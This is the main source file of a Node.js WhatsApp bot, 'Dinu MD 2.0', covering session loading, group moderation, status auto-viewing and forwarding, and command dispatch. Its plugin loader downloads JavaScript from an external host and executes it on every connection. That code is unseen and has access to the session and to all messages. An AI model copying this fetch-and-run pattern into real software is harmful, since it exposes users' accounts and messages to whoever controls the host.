//══════════════════════════════════════════════════════════════════════════════════════════════════════//
//                                                                                                      //
//                                   DINU MD 2.0 BOT                                               //
//                                                                                                      //
//                                         Ｖ：2.0                                                       //
//
//																											
//	                ██████╗░██╗███╗░░██╗██╗░░░██╗    ███╗░░░███╗██████╗░                     	//
//                	██╔══██╗██║████╗░██║██║░░░██║    ████╗░████║██╔══██╗                       	//
//                 	██║░░██║██║██╔██╗██║██║░░░██║    ██╔████╔██║██║░░██║                    	//
//                	██║░░██║██║██║╚████║██║░░░██║    ██║╚██╔╝██║██║░░██║                        //
//                	██████╔╝██║██║░╚███║╚██████╔╝    ██║░╚═╝░██║██████╔╝                        //
//                	╚═════╝░╚═╝╚═╝░░╚══╝░╚═════╝░    ╚═╝░░░░░╚═╝╚═════╝░    	                //
//
//
//══════════════════════════════════════════════════════════════════════════════════════════════════════//
//*
//  * @project_name : © Dinu MD 2.0
//  * @version      : 2.0
//  * @author       : Dineth Rusiru
//  * @youtube      : https://www.youtube.com/@Dineth_Rusiru
//  * @description  : © Dinu MD 1.0, A Multi-functional WhatsApp bot created by Dineth Rusiru
//*
//*
//Base by Dineth Rusiru
//GitHub: @dineth07github
//WhatsApp: +94785602293
//Want more free bot scripts? Subscribe to my YouTube channel: https://www.youtube.com/@Dineth_Rusiru
//   * Created By GitHub: Dineth_Rusiru
//   * Credit To Dineth_Rusiru
//   * © 2025 Dinu MD 1.0
// ⛥┌┤
// */

// ------------------- //
//     DEPEENDENCIES
// ------------------- //
const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    getContentType,
    downloadContentFromMessage,
    Browsers
} = require('@whiskeysockets/baileys');
const fs = require('fs');
const P = require('pino');
const util = require('util');
const axios = require('axios');
const path = require('path');
const https = require('https');
const express = require('express');
const { File } = require('megajs');

// ------------------- //
//   INTERNAL MODULES
// ------------------- //
const config = require('./config');
const { ownerNumber, BOT_OWNER } = require('./config');
const { sms } = require('./lib/msg');
const { getBuffer, getGroupAdmins, getRandom, isUrl, runtime, sleep, fetchJson } = require('./lib/functions');
const { replyHandlers, commands } = require('./command');

// ------------------- //
//     WEB SERVER
// ------------------- //
const app = express();
const port = process.env.PORT || 8000;

// ------------------- //
//   INITIALIZATIONS
// ------------------- //
const prefix = '.';
global.pluginHooks = [];

// Session check and download if not exists
if (!fs.existsSync(__dirname + '/auth_info_baileys/creds.json')) {
    if (!config.SESSION_ID) {
        return console.log('❗ [Dinu-MD] SESSION_ID not found in env. Please configure it.');
    }
    const sessdata = config.SESSION_ID;
    const filer = File.fromURL('https://mega.nz/file/' + sessdata);
    filer.download((err, data) => {
        if (err) throw err;
        fs.writeFile(__dirname + '/auth_info_baileys/creds.json', data, () => {
            console.log('📥 [Dinu-MD] Session file downloaded and saved.');
        });
    });
}


// ------------------- //
//   PLUGIN LOADER
// ------------------- //
async function loadRemotePlugins() {
    console.log('🔧 [Dinu-MD] Installing plugins...');
    const pluginListUrl = 'https://test30-26o.pages.dev/plugins.json';
    const pluginBaseUrl = 'https://test30-26o.pages.dev/plugins/';
    const pluginsDir = path.join(__dirname, 'remote_plugins');

    if (!fs.existsSync(pluginsDir)) {
        fs.mkdirSync(pluginsDir);
    }

    try {
        const response = await axios.get(pluginListUrl);
        const pluginFiles = response.data;

        for (const plugin of pluginFiles) {
            const pluginName = plugin.name;
            const pluginUrl = pluginBaseUrl + pluginName;
            const pluginPath = path.join(pluginsDir, pluginName);
            const writer = fs.createWriteStream(pluginPath);

            // Download the plugin file
            await new Promise((resolve, reject) => {
                https.get(pluginUrl, (res) => {
                    res.pipe(writer);
                    writer.on('finish', () => writer.close(resolve));
                }).on('error', (err) => {
                    fs.unlink(pluginPath, () => {});
                    reject(err);
                });
            });

            // Load the plugin
            try {
                const loadedPlugin = require(pluginPath);
                if (loadedPlugin && (loadedPlugin.onMessage || loadedPlugin.onDelete)) {
                    global.pluginHooks.push(loadedPlugin);
                }
            } catch (e) {
                console.error(`[❌ Error Loading Plugin] ${pluginName}:`, e.message);
            }
        }
        console.log('✅ [Dinu-MD] All plugins installed Successfully');
    } catch (error) {
        console.error('❌ [Dinu-MD] Failed to load plugins:', error.message);
    }
}


// ------------------- //
//   MAIN FUNCTION
// ------------------- //
async function connectToWA() {
    console.log('🛰️ [DANUWA-MD] Initializing WhatsApp connection...');
    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/auth_info_baileys/');

    const socket = makeWASocket({
        logger: P({ level: 'silent' }),
        printQRInTerminal: true,
        browser: Browsers.macOS('Firefox'),
        syncFullHistory: true,
        auth: state,
    });

    // --- GROUP PARTICIPANTS UPDATE HANDLER ---
    socket.ev.on('group-participants.update', async (update) => {
        try {
            const { id, participants, action } = update;
            const groupMetadata = await socket.groupMetadata(id);
            const groupName = groupMetadata.subject || 'No Group Name';

            // --- WELCOME MESSAGE ---
            if (action === 'add') {
                for (const participant of participants) {
                    // Anti-fake number feature (Sri Lanka only)
                    if (global.antiFakeGroups?.[id]) {
                        const userNumber = participant.split('@')[0];
                        if (!userNumber.startsWith('94')) {
                            await socket.sendMessage(id, {
                                text: `📵 @${userNumber} removed — only Sri Lankan numbers are allowed.`,
                                mentions: [participant]
                            });
                            await socket.groupParticipantsUpdate(id, [participant], 'remove');
                            continue;
                        }
                    }

                    const username = participant.split('@')[0];
                    const welcomeMessage = `🗯️ *WELCOME TO ${groupName}, @${username}!* ❤‍🩹\n\nWe’re delighted to have you join our community.\n\n✅ Please take a moment to read the group rules and feel free to introduce yourself.\n\n💎 *Let’s build a friendly and respectful environment together!*`;
                    await socket.sendMessage(id, {
                        image: { url: 'https://github.com/dineth07github/Dinu-MD-V2.0/blob/main/images/Welcome.png?raw=true' },
                        caption: welcomeMessage,
                        mentions: [participant]
                    });
                }
            }

            // --- GOODBYE MESSAGE ---
            if (action === 'remove') {
                for (const participant of participants) {
                    const username = participant.split('@')[0];
                    const goodbyeMessage = `👋 *Goodbye ලමයෝ @${username} from ${groupName}.* We wish you all the best!❤‍🩹*`;
                    await socket.sendMessage(id, {
                        image: { url: 'https://github.com/dineth07github/Dinu-MD-V2.0/blob/main/images/logo.png?raw=true' },
                        caption: goodbyeMessage,
                        mentions: [participant]
                    });
                }
            }
        } catch (error) {
            console.error('Group participants update error:', error);
        }
    });

    // --- CONNECTION UPDATE HANDLER ---
    socket.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close' && lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
            connectToWA();
        } else if (connection === 'open') {
            await loadRemotePlugins();
            console.log('Hey, DANUWA-MD started✅');
            const aliveMessage = `
╔═══◉ *🟢 STATUS: ONLINE* ◉═══╗
║  Hey Babe, I’m here to help you.  
║  Ask me anything! 💬
╚══════════════════════╝

🧾 *PROFILE INFORMATION*
┌──────── ⋆⋅☆⋅⋆ ────────┐
│ 🔐 *Owner:* Dineth Rusiru  
│ 👤 *Botname:* Dinu-MD  
│ ⚡ *Bio:* The Best WhatsApp Bot  
│ 🧩 *Role:* Wizard 🧙‍♂️  
└──────── ⋆⋅☆⋅⋆ ────────┘

🚀 Powered By *Dineth*
*Geek* 🔥`;
            socket.sendMessage(ownerNumber[0] + '@s.whatsapp.net', {
                image: { url: config.ALIVE_IMG },
                caption: aliveMessage
            });
        }
    });

    // --- SAVE CREDENTIALS ---
    socket.ev.on('creds.update', saveCreds);

    // --- MESSAGE UPSERT (NEW MESSAGE) HANDLER ---
    socket.ev.on('messages.upsert', async (upsert) => {
        let message = upsert.messages[0];
        if (!message.message) return;

        const messageType = getContentType(message.message);
        const messageContent = message.message[messageType];
        
        // --- MEDIA DOWNLOAD LOGIC ---
        if (['imageMessage', 'videoMessage', 'audioMessage', 'stickerMessage', 'documentMessage'].includes(messageType)) {
            try {
                const stream = await downloadContentFromMessage(messageContent, messageType.replace('Message', ''));
                let buffer = [];
                for await (const chunk of stream) {
                    buffer.push(chunk);
                }
                message._mediaBuffer = Buffer.concat(buffer);
                message._mediaType = messageType;
            } catch (e) {
                console.log('❌ Failed to pre-download media:', e.message);
            }
        }
        
        // Handle ephemeral messages
        if (getContentType(message.message) === 'ephemeralMessage') {
            message.message = message.message.ephemeralMessage.message;
        }

        // --- PLUGIN HOOKS (onMessage) ---
        if (global.pluginHooks) {
            for (const hook of global.pluginHooks) {
                if (hook.onMessage) {
                    try {
                        await hook.onMessage(socket, message);
                    } catch (e) {
                        console.log('onMessage error:', e);
                    }
                }
            }
        }
        
        // --- AUTO STATUS SEEN ---
        if (config.AUTO_STATUS_SEEN === 'true') {
            await socket.readMessages([message.key]);
            console.log(`Marked message from ${message.key.remoteJid} as read.`);
        }
        
        // --- STATUS HANDLING ---
        if (message.key?.remoteJid === 'status@broadcast') {
            const senderJid = message.key.participant || message.key.remoteJid || 'unknown@s.whatsapp.net';
            
            // Auto see status
            if (config.AUTO_STATUS_SEEN === 'true') {
                try {
                    await socket.readMessages([message.key]);
                    console.log(`[✓] Status seen: ${message.key.id}`);
                } catch (e) {
                    console.error('❌ Failed to mark status as seen:', e);
                }
            }

            // Auto status react
            if (config.AUTO_STATUS_REACT === 'true' && message.key.participant) {
                try {
                    const reactions = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '💜', '💙', '🌝', '🖤', '💚'];
                    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
                    await socket.sendMessage(message.key.participant, {
                        react: { text: randomReaction, key: message.key }
                    });
                    console.log(`[✓] Reacted to status of ${message.key.participant} with ${randomReaction}`);
                } catch (e) {
                    console.error('❌ Failed to react to status:', e);
                }
            }

            // Forward text status
            if (message.message?.extendedTextMessage && !message.message?.imageMessage && !message.message?.videoMessage) {
                const statusText = message.message.extendedTextMessage.text || '';
                if (statusText.trim().length > 0) {
                    try {
                        const forwardText = `╭─────── ⭓ ⭓ ⭓  ─────────╮
│    🍁 ༺ 𝒟𝒾𝓃𝓊 𝑀𝒟 ༻ 🍁    │
╰──────────────⟡───────╯

📝 *Text Status*
👤 From: @${senderJid.split('@')[0]}

${statusText}`;
                        await socket.sendMessage(ownerNumber[0] + '@s.whatsapp.net', {
                            text: forwardText,
                            mentions: [senderJid]
                        });
                        console.log(`✅ Text-only status from ${senderJid} forwarded.`);
                    } catch (e) {
                        console.error('❌ Failed to forward text status:', e);
                    }
                }
            }

            // Forward media status
            if (message.message?.imageMessage || message.message?.videoMessage) {
                try {
                    const mediaType = message.message.imageMessage ? 'imageMessage' : 'videoMessage';
                    const mediaContent = message.message[mediaType];
                    const stream = await downloadContentFromMessage(mediaContent, mediaType === 'imageMessage' ? 'image' : 'video');
                    let mediaBuffer = Buffer.from([]);
                    for await (const chunk of stream) {
                        mediaBuffer = Buffer.concat([mediaBuffer, chunk]);
                    }
                    const mimeType = mediaContent.mimetype || (mediaType === 'imageMessage' ? 'image/jpeg' : 'video/mp4');
                    const caption = mediaContent.caption || '';
                    const forwardCaption = `╭────── ⭓ ⭓ ⭓  ───────╮
│🍁 ༺ 𝒟𝒾𝓃𝓊 𝑀𝒟 ༻ 🍁│
╰──────────⟡────────╯

📥 *Forwarded Status*
👤 From: @${senderJid.split('@')[0]}

${caption}`;
                    await socket.sendMessage(ownerNumber[0] + '@s.whatsapp.net', {
                        [mediaType === 'imageMessage' ? 'image' : 'video']: mediaBuffer,
                        mimetype: mimeType,
                        caption: forwardCaption,
                        mentions: [senderJid]
                    });
                    console.log(`✅ Media status from ${senderJid} forwarded.`);
                } catch (e) {
                    console.error('❌ Failed to download or forward media status:', e);
                }
            }
        }
        
        // --- AUTO STATUS REPLY ---
        if (message.key && message.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === 'true') {
            const sender = message.key.participant;
            const replyMessage = '' + config.AUTO_STATUS__MSG;
            await socket.sendMessage(sender, {
                text: replyMessage,
                react: { text: '✈️', key: message.key }
            }, { quoted: message });
        }
        
        // ------------------- //
        //   COMMAND LOGIC
        // ------------------- //
        const danuwa = sms(socket, message);
        const msgContentType = getContentType(message.message);
        const from = message.key.remoteJid;
        
        const body = (msgContentType === 'conversation') ? message.message.conversation :
                     (message.message[msgContentType]?.text) || 
                     (message.message[msgContentType]?.caption) || '';

        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase() : '';
        const args = body.trim().split(/ +/).slice(1);
        const q = args.join(' ');

        const sender = message.key.fromMe ? (socket.user.id.split(':')[0] + '@s.whatsapp.net' || socket.user.id) : (message.key.participant || message.key.remoteJid);
        const senderNumber = sender.split('@')[0];
        const isGroup = from.endsWith('@g.us');
        
        const botNumber = socket.user.id.split(':')[0];
        const pushname = message.pushName || "Sin Nombre";
        const isMe = botNumber.includes(senderNumber);
        const isOwner = ownerNumber.includes(senderNumber) || isMe;

        const groupMetadata = isGroup ? await socket.groupMetadata(from).catch(() => ({})) : {};
        const groupName = groupMetadata?.subject || '';
        const participants = groupMetadata?.participants || [];
        const groupAdmins = isGroup ? getGroupAdmins(participants) : [];
        const isAdmins = groupAdmins.map(jidNormalizedUser).includes(jidNormalizedUser(sender));
        const isBotAdmins = groupAdmins.map(jidNormalizedUser).includes(jidNormalizedUser(socket.user.id));
        
        // --- ANTI-LINK ---
        if (isGroup && global.antiLinkGroups?.[from] && !isAdmins) {
            if (/(https?:\/\/[^\s]+)/i.test(body)) {
                await socket.sendMessage(from, { text: `🚫 Link detected!\n@${senderNumber} has been removed from *${groupName}*!`, mentions: [sender] });
                await socket.groupParticipantsUpdate(from, [sender], 'remove');
            }
        }

        // --- ANTI-BADWORD ---
        const badwords = ['fuck', 'shit', 'idiot', 'bitch', 'puka', 'උඹ', 'කැරියා', 'හුත්තා', 'පකයා', 'හුකන්නා', 'පොන්නයා'];
        if (isGroup && global.antiBadwordGroups?.[from] && !isAdmins) {
            if (badwords.some(word => body.toLowerCase().includes(word))) {
                await socket.sendMessage(from, { text: `🧼 Bad word detected!\n@${senderNumber} has been removed from *${groupName}*!`, mentions: [sender] });
                await socket.groupParticipantsUpdate(from, [sender], 'remove');
            }
        }

        const reply = (text, options = {}) => {
            socket.sendMessage(from, { text: text, ...options }, { quoted: message });
        }
        
        socket.decodeJid = (jid) => {
            if (!jid) return jid;
            if (/:\d+@/gi.test(jid)) {
                let decoded = jidDecode(jid) || {};
                return (decoded.user && decoded.server && decoded.user + '@' + decoded.server) || jid;
            } else return jid;
        };

        if (isCmd) {
            const cmd = commands.find(c => c.pattern === command || (c.alias && c.alias.includes(command)));
            if (cmd) {
                // Handle command mode (public/private)
                switch ((config.MODE || 'public').toLowerCase()) {
                    case 'private':
                        if (!isOwner) return;
                        break;
                    case 'public':
                    default:
                        break;
                }

                if (cmd.react) {
                    socket.sendMessage(from, { react: { text: cmd.react, key: message.key } });
                }

                try {
                    cmd.function(socket, message, danuwa, {
                        from,
                        quoted: message,
                        body,
                        isCmd,
                        command,
                        args,
                        q,
                        isGroup,
                        sender,
                        senderNumber,
                        botNumber2: jidNormalizedUser(socket.user.id),
                        botNumber,
                        pushname,
                        isMe,
                        isOwner,
                        groupMetadata,
                        groupName,
                        participants,
                        groupAdmins,
                        isBotAdmins,
                        isAdmins,
                        reply
                    });
                } catch (e) {
                    console.error(`[PLUGIN ERROR] ${e}`);
                }
            }
        }
        
        // --- REPLY HANDLERS (NO-PREFIX COMMANDS) ---
        for (const handler of replyHandlers) {
            if (handler.test(body, { sender: sender, message: message })) {
                try {
                    await handler.function(socket, message, danuwa, { from, quoted: message, body, sender, reply });
                    break; 
                } catch (e) {
                    console.log('Reply handler error:', e);
                }
            }
        }

    });
    
    // --- MESSAGE DELETE HANDLER ---
    socket.ev.on('messages.delete', async (del) => {
        if (global.pluginHooks) {
            for (const hook of global.pluginHooks) {
                if (hook.onDelete) {
                    try {
                        await hook.onDelete(socket, del);
                    } catch (e) {
                        console.log('onDelete error:', e);
                    }
                }
            }
        }
    });

}

// ------------------- //
//   START THE BOT
// ------------------- //
app.get('/', (req, res) => {
    res.send('Hey, Dinu-MD started✅');
});

app.listen(port, () => console.log(`🌐 [Dinu-MD] Web server running → http://localhost:${port}`));

setTimeout(() => {
    connectToWA();
}, 4000);
